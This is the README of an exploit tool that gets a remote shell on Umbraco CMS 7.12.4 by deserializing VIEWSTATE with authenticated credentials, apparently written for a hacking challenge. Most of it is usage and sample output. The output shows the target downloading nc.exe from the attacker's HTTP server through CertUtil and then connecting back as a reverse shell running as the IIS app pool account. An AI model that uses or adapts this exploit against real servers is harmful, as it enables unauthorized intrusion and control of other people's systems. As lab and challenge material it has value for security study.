# Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution 

## Summary

Authenticated by remote code execution in Umbraco CMS 7.12.4 by deserialize 
VIEWSTATE. This version is just weaponizes EDB-ID: 46153 

## Usage

Run command without arguments for usage menu.

```sh
⬢  umbraco_cms_rce  master ⦿ ./umbraco_cms_rce.py 

▄• ▄▌• ▌ ▄ ·. ▄▄▄▄· ▄▄▄   ▄▄▄·  ▄▄·       
█▪██▌·██ ▐███▪▐█ ▀█▪▀▄ █·▐█ ▀█ ▐█ ▌▪▪     
█▌▐█▌▐█ ▌▐▌▐█·▐█▀▀█▄▐▀▀▄ ▄█▀▀█ ██ ▄▄ ▄█▀▄ 
▐█▄█▌██ ██▌▐█▌██▄▪▐█▐█•█▌▐█ ▪▐▌▐███▌▐█▌.▐▌
 ▀▀▀ ▀▀  █▪▀▀▀·▀▀▀▀ .▀  ▀ ▀  ▀ ·▀▀▀  ▀█▄▀▪
[nighter@nighter.se]
    
Usage: ./umbraco_cms_rce.py <URL> <LHOST> <LPORT> <USERNAME> <PASSWORD>
EXAMPLE: ./umbraco_cms_rce.py 'http://127.0.0.1' 10.10.14.24 1337 <USERNAME> <PASSWORD>
```

Run with arguments to get a proper shell. Output is censored to not spoil a hacking challenge where this script was written for.

```sh
⬢  umbraco_cms_rce  master ⦿ ./umbraco_cms_rce.py http://10.10.XX.XX 10.10.XX.XX 9001 username password
[+] Netcat = 9001
[+] HTTP Listen = 8000
[+] Exploit
10.10.10.XX - - [09/Apr/2020 16:04:35] "GET /nc.exe HTTP/1.1" 200 -
10.10.10.XX - - [09/Apr/2020 16:04:35] "GET /nc.exe HTTP/1.1" 200 -
****  Online  ****
  0000  ...
  8eb0
CertUtil: -URLCache command completed successfully.

Connection from 10.10.10.XX:49974
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```